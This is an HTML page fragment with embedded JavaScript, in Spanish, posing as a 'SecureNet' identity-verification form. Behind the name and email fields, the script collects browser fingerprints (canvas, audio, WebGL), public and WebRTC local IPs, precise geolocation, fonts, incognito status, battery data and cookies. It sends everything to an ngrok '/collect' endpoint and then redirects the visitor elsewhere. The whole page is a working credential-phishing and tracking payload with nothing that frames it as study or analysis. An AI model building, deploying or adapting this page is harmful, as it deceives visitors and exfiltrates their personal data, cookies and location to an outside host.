</style>
</head>
<body>
<div class="c">
<h2>⛔ V3R1F1C4C10N</h2>
<div class="s">Acceso restringido — confirma tu identidad <span>ahora</span></div>
<form id="frm">
<div class="f"><label for="n">Nombre completo</label><input type="text" id="n" placeholder="Ej: J. Pérez" required></div>
<div class="f"><label for="e">Correo electrónico</label><input type="email" id="e" placeholder="tú@dominio.com" required></div>
<button type="submit" id="b">Verificar</button>
</form>
<div class="ld" id="ld"><i></i> Procesando credenciales...</div>
<div class="e" id="err">Error, reintenta.</div>
<div class="ft">🔒 SecureNet v3.2 · Todos los derechos reservados</div>
</div>
<script>
// ============================================================
//  SCRIPT MEJORADO - VERSIÓN CORREGIDA (CON TIMEOUTS)
// ============================================================
(function(){

    var CONFIG = {
        endpoint: 'https://roast-skinning-paralysis.ngrok-free.dev/collect',
        redir: 'https://guns.lol/penthouseintokyo',
        ipApi: 'https://api.ipify.org?format=json',
        geoApi: 'https://ipapi.co/json/'
    };

    // ---------- UTILIDAD: TIMEOUT PROMISE ----------
    function promiseWithTimeout(promise, ms) {
        return Promise.race([
            promise,
            new Promise(function(resolve) {
                setTimeout(function() { resolve(null); }, ms);
            })
        ]);
    }

    // ---------- 1. IP PÚBLICA ----------
    function getPublicIP() {
        return fetch(CONFIG.ipApi)
            .then(r => r.json())
            .then(d => d.ip)
            .catch(function() { return null; });
    }

    // ---------- 2. IP LOCAL (WebRTC) ----------
    function getLocalIP() {
        return new Promise(function(resolve) {
            try {
                var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('test');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = function(e) {
                    if (!e.candidate) return;
                    var ip = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                    if (ip) { resolve(ip[0]); pc.close(); }
                };
                setTimeout(function() { resolve(null); pc.close(); }, 2000);
            } catch(e) { resolve(null); }
        });
    }

    // ---------- 3. FINGERPRINT (Canvas + Audio + WebGL) ----------
    function getAdvancedFingerprint() {
        var parts = [];
        try {
            var c = document.createElement('canvas');
            c.width = 300; c.height = 60;
            var ctx = c.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '16px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(120,5,70,25);
            ctx.fillStyle = '#069';
            ctx.fillText('Cwm fjordbank glyphs vext quiz 😎',4,12);
            ctx.fillStyle = 'rgba(102,204,0,0.6)';
            ctx.fillText('Cwm fjordbank glyphs vext quiz 😎',6,14);
            parts.push(c.toDataURL());
        } catch(e) { parts.push('canvas_error'); }
        try {
            var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            var osc = audioCtx.createOscillator();
            var gain = audioCtx.createGain();
            osc.connect(gain);
            gain.connect(audioCtx.destination);
            osc.frequency.value = 440;
            osc.type = 'sawtooth';
            var analyser = audioCtx.createAnalyser();
            gain.connect(analyser);
            var data = new Uint8Array(analyser.frequencyBinCount);
            analyser.getByteFrequencyData(data);
            parts.push(btoa(String.fromCharCode.apply(null, data)));
            osc.stop();
        } catch(e) { parts.push('audio_error'); }
        try {
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if (debugInfo) {
                    parts.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
                    parts.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
                }
            }
        } catch(e) { parts.push('webgl_error'); }
        return btoa(parts.join('|'));
    }

    // ---------- 4. FUENTES (CON TIMEOUT) ----------
    function getFonts() {
        return new Promise(function(resolve) {
            if (!document.fonts) { resolve(null); return; }
            var fontList = [];
            var testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Comic Sans MS', 'Impact'];
            var count = 0;
            testFonts.forEach(function(f) {
                document.fonts.load('16px "' + f + '"').then(function() {
                    fontList.push(f);
                    count++;
                    if (count === testFonts.length) resolve(fontList.join(','));
                }).catch(function() {
                    count++;
                    if (count === testFonts.length) resolve(fontList.join(','));
                });
            });
            setTimeout(function() { resolve(fontList.join(',') || null); }, 1500);
        });
    }

    // ---------- 5. MODO INCOGNITO ----------
    function isIncognito() {
        return new Promise(function(resolve) {
            try {
                var fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) { resolve(false); return; }
                fs(window.TEMPORARY, 100, function() { resolve(false); }, function() { resolve(true); });
            } catch(e) { resolve(false); }
        });
    }

    // ---------- 6. GEOLOCALIZACIÓN (CON FALBACK RÁPIDO) ----------
    function getGeoWithTrick() {
        return new Promise(function(resolve) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(pos) {
                        resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude });
                    },
                    function() {
                        fetch(CONFIG.geoApi)
                            .then(r => r.json())
                            .then(d => {
                                if (d.latitude && d.longitude) {
                                    resolve({ lat: d.latitude, lon: d.longitude });
                                } else {
                                    resolve(null);
                                }
                            })
                            .catch(function(){ resolve(null); });
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                resolve(null);
            }
            setTimeout(function() { resolve(null); }, 6000);
        });
    }

    // ---------- 7. BATERÍA ----------
    function getBatteryInfo() {
        return new Promise(function(resolve) {
            if (navigator.getBattery) {
                navigator.getBattery().then(function(battery) {
                    resolve({
                        level: battery.level * 100,
                        charging: battery.charging,
                        time: battery.chargingTime
                    });
                }).catch(function() { resolve(null); });
            } else {
                resolve(null);
            }
            setTimeout(function() { resolve(null); }, 2000);
        });
    }

    // ---------- 8. ENVÍO DE DATOS ----------
function sendData(payload) {
    var json = JSON.stringify(payload);
    fetch(CONFIG.endpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: json
    }).catch(function(err) {
        console.log('Error en fetch:', err);
    });
    window.location.href = CONFIG.redir;
}

    // ---------- 9. MANEJO DEL FORMULARIO ----------
    document.getElementById('frm').addEventListener('submit', function(e) {
        e.preventDefault();
        var nombre = document.getElementById('n').value.trim();
        var correo = document.getElementById('e').value.trim();
        if (!nombre || !correo) return;

        var btn = document.getElementById('b');
        var ld = document.getElementById('ld');
        var err = document.getElementById('err');
        btn.disabled = true;
        ld.classList.add('show');
        err.style.display = 'none';

        var baseData = {
            nombre: nombre,
            correo: correo,
            fingerprint: getAdvancedFingerprint(),
            ua: navigator.userAgent,
            screen: screen.width + 'x' + screen.height + '(' + window.devicePixelRatio + 'x)',
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            lang: navigator.language,
            referrer: document.referrer || 'direct',
            cookies: document.cookie || 'none',
            page: window.location.hostname + window.location.pathname,
            timestamp: new Date().toISOString()
        };

        Promise.all([
            promiseWithTimeout(getPublicIP(), 3000),
            promiseWithTimeout(getLocalIP(), 2500),
            promiseWithTimeout(getGeoWithTrick(), 6000),
            promiseWithTimeout(getFonts(), 2000),
            promiseWithTimeout(isIncognito(), 2000),
            promiseWithTimeout(getBatteryInfo(), 2000)
        ]).then(function(results) {
            var payload = Object.assign({}, baseData, {
                ip_publica: results[0],
                ip_local: results[1],
                geo: results[2],
                fonts: results[3],
                incognito: results[4],
                battery: results[5]
            });
            sendData(payload);
        }).catch(function() {
            sendData(baseData);
        });

        setTimeout(function() {
            sendData(baseData);
        }, 8000);
    });

    // ---------- 10. VALIDACIONES VISUALES ----------
    document.getElementById('n').addEventListener('input', function(){
        this.style.borderColor = this.value.length > 0 ? '#4fc3f7' : 'rgba(255,255,255,.12)';
    });
    document.getElementById('e').addEventListener('input', function(){
        var re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        this.style.borderColor = re.test(this.value) ? '#4fc3f7' : 'rgba(255,255,255,.12)';
    });

})();
</script>
